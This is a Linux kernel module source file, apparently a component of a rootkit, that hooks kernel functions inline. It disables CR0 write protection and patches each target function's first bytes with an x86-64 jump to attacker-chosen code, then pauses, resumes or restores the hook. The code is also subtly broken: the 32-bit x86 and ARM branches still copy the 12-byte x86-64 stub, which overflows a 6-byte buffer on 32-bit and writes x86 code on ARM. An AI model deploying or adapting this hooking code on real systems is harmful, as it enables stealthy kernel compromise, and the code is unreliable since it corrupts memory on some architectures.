#include "common.h"
#include <linux/slab.h>
#include <asm/cacheflush.h>

#if defined(_CONFIG_X86_)
    #define HIJACK_SIZE 6
#elif defined(_CONFIG_X86_64_)
    #define HIJACK_SIZE 12
#else // ARM
    #define HIJACK_SIZE 12
#endif

struct sym_hook {
    void *addr;
    unsigned char o_code[HIJACK_SIZE];//原函数前HIJACK_SIZE个字节的备份
    unsigned char n_code[HIJACK_SIZE];//hook函数的shellcode
    struct list_head list;
};

LIST_HEAD(hooked_syms);

#if defined(_CONFIG_X86_) || defined(_CONFIG_X86_64_)
// Thanks Dan
inline unsigned long disable_wp ( void )
{
    unsigned long cr0;

    preempt_disable();
    barrier();

    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    return cr0;
}

inline void restore_wp ( unsigned long cr0 )
{
    write_cr0(cr0);

    barrier();
    preempt_enable_no_resched();
}
#else // ARM
void cacheflush ( void *begin, unsigned long size )
{
    flush_icache_range((unsigned long)begin, (unsigned long)begin + size);
}
#endif

void hijack_start ( void *target, void *new )
{
    struct sym_hook *sa;
    unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];

    unsigned long o_cr0;

    // mov rax, $addr; jmp rax
    memcpy(n_code, "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0", HIJACK_SIZE);
    *(unsigned long *)&n_code[2] = (unsigned long)new;
	#if __DEBUG_HOOK__
	printk("x64 n_code: 0x%0x\tnew: 0x%0x\n", *n_code, (unsigned int)new);
	#endif

    #if __DEBUG_HOOK__
    printk("Hooking function 0x%p with 0x%p\n", target, new);
    #endif

	//备份原来函数前HIJACK_SIZE个字节
    memcpy(o_code, target, HIJACK_SIZE);

    o_cr0 = disable_wp();
	//将shellcode填充到调用函数前HIJACK_SIZE字节达到hook此函数的目的
    memcpy(target, n_code, HIJACK_SIZE);
    restore_wp(o_cr0);

    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
    if ( ! sa )
        return;

    sa->addr = target;
    memcpy(sa->o_code, o_code, HIJACK_SIZE);
    memcpy(sa->n_code, n_code, HIJACK_SIZE);

    list_add(&sa->list, &hooked_syms);
	#if __DEBUG_HOOK__
    printk("sa: %p\tsa->list: 0x%p\t hooked_syms: %p\n", *sa, sa->list, &hooked_syms);
    #endif
}

void hijack_pause ( void *target )
{
    struct sym_hook *sa;

    #if __DEBUG_HOOK__
    printk("Pausing function hook 0x%p\n", target);
    #endif

    list_for_each_entry ( sa, &hooked_syms, list )
        if ( target == sa->addr )
        {
            unsigned long o_cr0 = disable_wp();
			//恢复函数前HIJACK_SIZE个字节，卸载钩子
            memcpy(target, sa->o_code, HIJACK_SIZE);
            restore_wp(o_cr0);
        }
}

void hijack_resume ( void *target )
{
    struct sym_hook *sa;

    #if __DEBUG_HOOK__
    printk("Resuming function hook 0x%p\n", target);
    #endif

    list_for_each_entry ( sa, &hooked_syms, list )
        if ( target == sa->addr )
        {
            unsigned long o_cr0 = disable_wp();
			//填充shellcode，安装钩子
            memcpy(target, sa->n_code, HIJACK_SIZE);
            restore_wp(o_cr0);
        }
}

void hijack_stop ( void *target )
{
    struct sym_hook *sa;

    #if __DEBUG_HOOK__
    printk("Unhooking function 0x%p\n", target);
    #endif

    list_for_each_entry ( sa, &hooked_syms, list )
        if ( target == sa->addr )
        {
            #if defined(_CONFIG_X86_) || defined(_CONFIG_X86_64_)
            unsigned long o_cr0 = disable_wp();
            memcpy(target, sa->o_code, HIJACK_SIZE);
            restore_wp(o_cr0);
            #else // ARM
            memcpy(target, sa->o_code, HIJACK_SIZE);
            cacheflush(target, HIJACK_SIZE);
            #endif

            list_del(&sa->list);
            kfree(sa);
            break;
        }
}

char *strnstr ( const char *haystack, const char *needle, size_t n )
{
    char *s = strstr(haystack, needle);

    if ( s == NULL )
        return NULL;

    if ( s - haystack + strlen(needle) <= n )
        return s;
    else
        return NULL;
}

void *memmem ( const void *haystack, size_t haystack_size, const void *needle, size_t needle_size )
{
    char *p;

    for ( p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++ )
        if ( memcmp(p, needle, needle_size) == 0 )
            return (void *)p;

    return NULL;
}

void *memstr ( const void *haystack, const char *needle, size_t size )
{
    char *p;
    size_t needle_size = strlen(needle);

    for ( p = (char *)haystack; p <= ((char *)haystack - needle_size + size); p++ )
        if ( memcmp(p, needle, needle_size) == 0 )
            return (void *)p;

    return NULL;
}

